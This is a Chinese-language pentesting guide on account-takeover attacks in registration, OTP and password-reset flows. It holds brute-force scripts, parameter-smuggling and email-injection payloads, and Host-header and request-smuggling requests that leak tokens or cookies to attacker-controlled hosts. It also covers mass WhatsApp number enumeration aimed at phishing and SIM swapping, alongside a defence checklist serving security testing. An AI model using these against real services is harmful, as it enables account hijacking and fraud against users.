---
attack_surface: [认证/授权绕过, 注入类, 信息泄露, 竞态/时序, 配置缺陷]
impact: [身份伪造, 权限提升, 信息泄露, 完整性破坏]
risk_level: 严重
prerequisites:
  - Burp Suite 基础操作
  - HTTP 协议基础
  - 基本 Python/ffuf 工具使用
related_techniques:
  - password-reset
  - oauth-to-account-takeover
  - 2fa-bypass
  - race-condition
  - sql-injection
  - jwt-hacking
  - email-injections
  - phone-number-injections
  - captcha-bypass
  - rate-limit-bypass
difficulty: 中级
tools:
  - Burp Suite (Repeater, Intruder, Turbo Intruder)
  - ffuf
  - smuggler.py
  - Collaborator
---

# Registration Vulnerabilities — 注册与账户接管漏洞全矩阵

> 关联文档：[Password Reset](../../Reset Password/) · [OAuth Takeover](../../../External Identity Management/OAuth/) · [2FA Bypass](../../2FA-OTP Bypass/) · [Race Condition](../Race Condition/) · [SQL Injection](../../../Search/SQL Injection/) · [JWT Hacking](../../../Structured objects/JWT/) · [Email Injections](../../../Structured objects/Email Injections/) · [Phone Injections](../../../Structured objects/Phone Injections/) · [CAPTCHA Bypass](../../Captcha Bypass/) · [Rate Limit Bypass](../../Rate Limit Bypass/)

---

# 0x01 原理与分类

## 1.0 TL;DR

注册流程是 Web 应用安全中最丰富但最常被低估的攻击面之一。攻击者可在账户生命周期的每个阶段——从注册前（重复注册、用户名枚举）、注册中（验证绕过、预劫持）、到注册后（密码重置接管、跨技术 ATO）——实施账户接管。本指南覆盖完整的注册攻击生命周期，包括 Microsoft 提出的 Pre-Hijacking 技术分类和 WhatsApp 级大规模枚举方法论。

## 1.1 注册流程攻击面模型

```
[注册前] → [注册中] → [验证阶段] → [激活后] → [长期]
    │           │           │           │          │
 重复注册     SQL注入     OTP暴力     密码重置   预劫持
 用户枚举     弱密码      竞态绕过    令牌泄露   持久化
              SSO合并    参数走私    CSRF/XSS   会话残留
```

## 1.2 攻击分类矩阵

| 攻击阶段 | 技术 | 影响 | 难度 |
|----------|------|------|------|
| 注册前 | 重复注册 / 用户名枚举 | 信息披露、账户预占 | 低 |
| 注册中 | SQL 注入 / SSO 合并缺陷 | 权限提升、数据泄露 | 中 |
| 验证阶段 | OTP 暴力 / 参数走私 / 竞态绕过 | 账户接管、身份伪造 | 中 |
| 激活后 | 预劫持 (Pre-Hijacking) | 延迟账户接管 | 高 |
| 长期 | 密码重置接管 / XSS / CSRF / JWT | 完整账户接管 (ATO) | 中-高 |
| 规模化 | 联系发现 / 大规模枚举 | 批量目标采集 | 中 |

---

# 0x02 重复注册与用户枚举

## 2.1 重复注册绕过

尝试使用已存在的用户名注册，测试唯一性检查的完整性：

### 邮箱变体绕过

| 技术 | 示例 | 目标 |
|------|------|------|
| 大小写变化 | `Victim@gmail.com` | 绕过区分大小写的检查 |
| 加号子地址 | `victim+1@gmail.com` | 利用 Gmail 忽略 `+` 后内容的特性 |
| 加点变化 | `v.ic.tim@gmail.com` | Gmail 忽略用户名中的点 |
| 特殊字符注入 | `victim%00@test.com` | 利用后端解析差异 |
| 尾部空格 | `victim@test.com ` (空格) | 后端 trim 不一致 |
| 双邮箱串联 | `victim@gmail.com@attacker.com` | 解析混淆 |
| 反向串联 | `victim@attacker.com@gmail.com` | 不同解析器取不同部分 |
| Unicode 同形字 | `vìctim@gmail.com` | IDN 同形异义字攻击 |
| 软连字符 | `vic­tim@gmail.com` | 显示无差异但字节不同 |

**利用目标**：
- 绕过邮箱唯一性检查
- 获取重复账户/工作区邀请
- 阻止受害者注册（临时 DoS），为后续接管做准备
- 利用服务商规范化差异：Gmail 忽略点和子地址；部分服务商对本地部分不区分大小写

## 2.2 用户名枚举

检测应用是否泄露已注册用户信息：

- **差异错误消息**：已存在用户返回 "用户名已被注册"，不存在返回 "邮箱未找到"
- **HTTP 状态码差异**：200 vs 400 vs 403
- **时序差异**：已存在用户可能触发 IdP/数据库查询，响应时间不同
- **表单自动填充**：输入已知邮箱后注册表单自动填充用户资料
- **团队/邀请流程**：输入邮箱后显示是否已有账户

## 2.3 弱密码策略

创建用户时检查密码策略是否允许弱密码。如果允许，可配合用户名枚举进行暴力破解。

---

# 0x03 邮箱/手机验证绕过

## 3.1 OTP 暴力破解

### 常见缺陷

| 缺陷 | 描述 |
|------|------|
| 可预测 OTP | 4-6 位数字，无有效速率限制 |
| OTP 跨操作复用 | 同一验证码可用于登录和注册 |
| OTP 未绑定用户 | 验证码不绑定到特定用户/操作 |
| 响应预言机 | 通过状态码/消息/响应体长度区分错误类型（错码 vs 过期 vs 错用户） |
| 令牌未失效 | 成功后或密码/邮箱变更后未注销令牌 |
| 令牌未绑定 UA/IP | 允许从攻击者控制的页面跨源完成验证 |

### ffuf 暴力破解示例

```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","code":"FUZZ"}' \
  -fr 'Invalid|Too many attempts' -mc all
```

### Turbo Intruder 并发洪水

绕过顺序锁定（利用并发请求同时尝试多个验证码）：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
    for code in range(0,1000000):
        body = '{"email":"victim@example.com","code":"%06d"}' % code
        engine.queue(target.req, body=body)


def handleResponse(req, interesting):
    if req.status != 401 and b'Invalid' not in req.response:
        table.add(req)
```

## 3.2 参数走私（Multi-Value Smuggling）

部分后端接受多个验证码并验证"任一匹配"即通过：

```
# 重复参数
code=000000&code=123456

# JSON 数组
{"code":["000000","123456"]}

# 混合参数名
otp=000000&one_time_code=123456

# 逗号/管道分隔
code=000000,123456
code=000000|123456
```

## 3.3 验证竞态条件

同时在两个会话中提交相同的有效 OTP——其中一个会话可能绕过验证并成为已验证的攻击者账户，而受害者流程也显示成功。

## 3.4 Host 头投毒

修改验证链接中的 Host 头以泄露令牌至攻击者服务器：

```http
POST /reset.php HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
```

若应用基于 Host 头生成验证链接，受害者点击 `https://attacker.com/verify?token=REAL_TOKEN` 时令牌即被泄露。

---

# 0x04 账户预劫持（Pre-Hijacking）

## 4.1 攻击模型

Pre-Hijacking 是 Microsoft 提出的一类攻击：攻击者在受害者创建账户**之前**执行操作，受害者在不知情的情况下使用被篡改的账户，攻击者随后重新获得访问权。

## 4.2 五种预劫持技术

### Classic-Federated Merge（经典联合合并）

```
攻击者: 用受害者邮箱注册经典账户，设置密码
受害者: 后续使用 SSO（同一邮箱）登录
漏洞: 不安全的合并逻辑可能让双方都保持登录，或恢复攻击者的访问权限
```

### Unexpired Session Identifier（未过期会话标识符）

```
攻击者: 创建账户并保持长期会话（不注销）
受害者: 重置/设置密码并使用账户
测试点: 密码重置或 MFA 启用后旧会话是否仍保持有效
```

### Trojan Identifier（木马标识符）

```
攻击者: 向预创建的账户添加辅助标识符（电话、额外邮箱、或链接攻击者的 IdP）
受害者: 重置密码
攻击者: 后续使用木马标识符重置密码或登录
```

### Unexpired Email Change（未过期邮箱变更）

```
攻击者: 发起邮箱变更为攻击者邮箱，但暂不确认
受害者: 恢复账户并开始使用
攻击者: 稍后完成挂起的邮箱变更以窃取账户
```

### Non-Verifying IdP（不验证身份的 IdP）

```
攻击者: 使用不验证邮箱所有权的 IdP 声称 victim@...
受害者: 通过经典方式注册
漏洞: 服务仅按邮箱合并，未检查 email_verified 或执行本地验证
```

## 4.3 测试方法

- 从 Web/移动端套件收集注册、SSO 链接、邮箱/电话变更、密码重置端点
- 创建自动化脚本在执行其他流程时保持会话存活
- 对于 SSO 测试：搭建测试 OIDC 提供方，签发带 `email` claim 和 `email_verified=false` 的令牌，检查 RP 是否信任未验证的 IdP
- 每次密码重置或邮箱变更后验证：
  - 所有其他会话和令牌是否已失效
  - 挂起的邮箱/电话变更能力是否已取消
  - 先前链接的 IdP/邮箱/电话是否需要重新验证

---

# 0x05 密码重置接管

## 5.1 密码重置令牌泄露（Referrer 头）

1. 向自己的邮箱请求密码重置
2. 点击密码重置链接
3. **不要修改密码**
4. 点击页面中的任意第三方链接（如 Facebook、Twitter）
5. 在 Burp 中拦截请求
6. 检查 Referer 头是否泄露了 `?token=xxx` 参数

## 5.2 密码重置投毒（Host Header）

```http
POST /reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: attacker.com
```

应用生成的重置链接变为：`https://attacker.com/reset-password.php?token=TOKEN`

## 5.3 邮箱参数污染

```bash
# 参数污染（可能发送到两个邮箱）
email=victim@mail.com&email=hacker@mail.com

# JSON 数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送注入
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符变体
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

## 5.4 IDOR 参数篡改

在修改密码的 API 请求中篡改用户标识参数：

```
POST /api/changepass
{"form": {"email":"victim@email.com","password":"securepwd"}}
```

## 5.5 弱密码重置令牌

令牌生成算法可能基于以下可预测因素：

| 因素 | 攻击方法 |
|------|----------|
| 时间戳 (Timestamp) | 枚举附近时间生成令牌 |
| 用户 ID (UserID) | 已知用户 ID 可推算 |
| 邮箱地址 | 基于已知邮箱生成 |
| 姓名 | 基于公开信息生成 |
| 生日 | 基于社工信息生成 |
| 纯数字令牌 | 暴力枚举（空间小） |
| 短字符序列 `[A-Za-z0-9]` | 若长度 < 8，暴力破解 |
| 令牌不失效 | 收集后随时使用 |
| 令牌无过期时间 | 长期有效窗口 |

## 5.6 响应中的令牌泄露

1. 通过 API/UI 为特定邮箱触发密码重置
2. 检查服务器响应中的 `resetToken` 字段
3. 直接构造重置 URL：`https://example.com/v3/user/password/reset?resetToken=[TOKEN]&email=[MAIL]`

## 5.7 用户名碰撞 (Username Collision)

CTFd 平台曾存在此漏洞（[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)）：

1. 注册一个与受害者用户名相同但前后加空格的用户名（如 `"admin "`）
2. 使用恶意用户名请求密码重置
3. 收到的重置令牌实际上可重置受害者账户
4. 使用新密码登录受害者账户

---

# 0x06 跨技术账户接管

## 6.1 XSS → Session Cookie 窃取

1. 在应用或子域名中找到 XSS（如果 Cookie 作用域为父域 `*.domain.com`）
2. 泄露当前会话 Cookie
3. 使用 Cookie 以受害者身份认证

## 6.2 HTTP Request Smuggling → Cookie 窃取

使用 smuggler 检测走私类型后构造请求：

```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```

受害者的请求被走私至 Burp Collaborator，Cookie 被泄露。

**相关报告**：
- [HackerOne #737140](https://hackerone.com/reports/737140)
- [HackerOne #771666](https://hackerone.com/reports/771666)

## 6.3 CSRF → 密码覆写

1. 构造 CSRF payload（如"自动提交修改密码表单的 HTML 页面"）
2. 当受害者访问攻击者页面时，自动以受害者身份提交密码变更请求

## 6.4 JWT 篡改

- 修改 JWT 中的 User ID / Email 以冒充其他用户
- 检查 JWT 签名是否为弱算法（`none`、弱 HMAC 密钥）

---

# 0x07 注册即重置（Registration-as-Reset / Upsert）

## 7.1 原理

部分注册端点对已存在的邮箱执行 **upsert**（update or insert）操作。若端点接收最小请求体（仅邮箱和密码）且不执行所有权验证，发送受害者邮箱将**在无需认证的情况下覆写其密码**。

## 7.2 发现方法

- 从捆绑的 JS（或移动应用流量）中收集端点名称
- 使用 ffuf/dirsearch 对类似 `/parents/application/v4/admin/FUZZ` 的基础路径进行模糊测试
- **方法提示**：GET 请求返回 `"Only POST request is allowed."` 通常表明正确的 HTTP 方法和预期的 JSON 格式

## 7.3 Payload

```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```

**影响**：无需重置令牌、OTP 或邮箱验证，即可实现完整账户接管（Full ATO）。

---

# 0x08 联系发现与大规模枚举

## 8.1 WhatsApp 级枚举方法论

以手机号为中心的信使类应用暴露一个**存在性预言机（Presence Oracle）**——客户端同步联系人时的地址簿上传接口。历史上，重放 WhatsApp 的发现请求可实现 **每小时 >1 亿次查找**，允许几乎完整的账户枚举。

### 攻击工作流

1. **检测官方客户端**：捕获地址簿上传请求（经认证的标准化 E.164 号码 blob），使用攻击者生成的号码重放，复用相同的 Cookie/设备令牌
2. **批量查询**：WhatsApp 接受数千个标识符并返回注册/未注册状态及元数据（商业版、伴侣设备等），离线分析响应构建目标列表，无需向受害者发送消息
3. **水平扩展**：使用 SIM 卡库、云设备或住宅代理分散枚举，使每个账户/IP/ASN 的限流永不触发

### 号码规划建模

按国家建模拨号规划以跳过无效候选。NDSS 数据集（`country-table.*`）列出国家代码、采用密度和平台分布：

```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # 印度手机号为 10 位
for suffix in product("0123456789", repeat=10):
    candidate = prefix + "".join(suffix)
    enqueue(candidate)
```

在查询预言机之前，优先选择与实际分配匹配的前缀（移动国家代码 + 国内目的代码）以保持吞吐量有效。

### 枚举结果武器化

- 将泄露的手机号（如 Facebook 2021 年数据泄露）输入预言机，了解哪些身份仍然活跃后进行钓鱼、SIM 交换或垃圾信息
- 按国家/OS/应用类型切片普查数据，找出 SMS 过滤薄弱或 WhatsApp Business 采纳率高的地区以进行本地化社工

### 公钥重用关联

WhatsApp 在会话建立期间暴露每个账户的 X25519 身份密钥。为每个枚举号码请求身份材料并去重公钥以揭示账户农场、克隆客户端或不安全固件——共享密钥可去匿名化多 SIM 操作。

---

# 0x09 检测与防御

## 9.1 注册流程检测清单

### 黑盒测试

| 测试点 | 方法 |
|--------|------|
| 重复注册 | 使用已知用户的邮箱变体尝试注册 |
| 用户名枚举 | 对比已存在/不存在用户的响应差异（状态码、消息、时间） |
| 弱密码策略 | 尝试注册 `123456` 等常见弱密码 |
| 一次性邮箱绕过 | 使用 mailinator/yopmail 等临时邮箱注册 |
| 超长密码 DoS | 发送 >200 字符的密码，检查服务器响应 |
| 速率限制 | 短时间内大量注册请求 |
| 邮箱参数污染 | 使用 `\ncc:` 注入、逗号分隔、JSON 数组等 |
| OTP 暴力破解 | 并发请求 + 参数走私 |
| Host 头投毒 | 修改 Host / X-Forwarded-Host |
| 令牌信息泄露 | 检查响应体、Referer 头 |
| IDOR | 篡改修改密码请求中的用户标识 |
| Upsert 端点 | 对已知存在的邮箱调用注册 API |
| Pre-Hijacking | 创建账户 → 保持会话 → 触发受害者流程 → 检查访问是否保留 |

### 白盒审计

- 审计邮箱规范化逻辑：检查是否统一 trim、lowercase、移除子地址
- 检查验证码绑定：OTP 是否绑定用户、操作、设备和时间窗口
- 审计密码重置令牌生成：是否使用 `secrets.token_urlsafe()`
- 检查 upsert 行为：注册端点是否对已存在邮箱执行更新操作
- 验证会话失效：密码重置/邮箱变更后所有旧会话是否被撤销

## 9.2 防御策略

| 层面 | 措施 |
|------|------|
| 邮箱验证 | 发送验证链接，未验证前限制账户功能 |
| OTP 安全 | 6+ 位随机、限 3 次尝试、60 秒过期、绑定用户+操作+设备 |
| 令牌生成 | `secrets.token_urlsafe(32)`，包含熵值、设置合理过期时间 |
| 幂等性 | 注册端点对已存在邮箱返回 "请检查邮箱" 而非执行 upsert |
| 速率限制 | 按 IP + 用户 + 设备指纹进行多维度限流 |
| 会话管理 | 密码重置/邮箱变更后立即使所有旧会话失效 |
| SSO 安全 | 检查 `email_verified` claim，不信任未验证邮箱的 IdP |
| Pre-Hijacking 防御 | 账户恢复后取消所有挂起的变更请求和链接的 IdP |
| 编码规范 | 邮箱统一 trim + lowercase 后再存储和比对 |

---

## 参考资料

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre-hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [SalmonSec Account Takeover Cheatsheet](https://salmonsec.com/cheatsheet/account_takeover)
- [WhatsApp Census — NDSS 2026 paper & dataset](https://github.com/sbaresearch/whatsapp-census)
- [CVE-2020-7245 — CTFd Username Collision](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
- [HackerOne #737140 — Request Smuggling ATO](https://hackerone.com/reports/737140)
- [HackerOne #771666 — Request Smuggling ATO](https://hackerone.com/reports/771666)
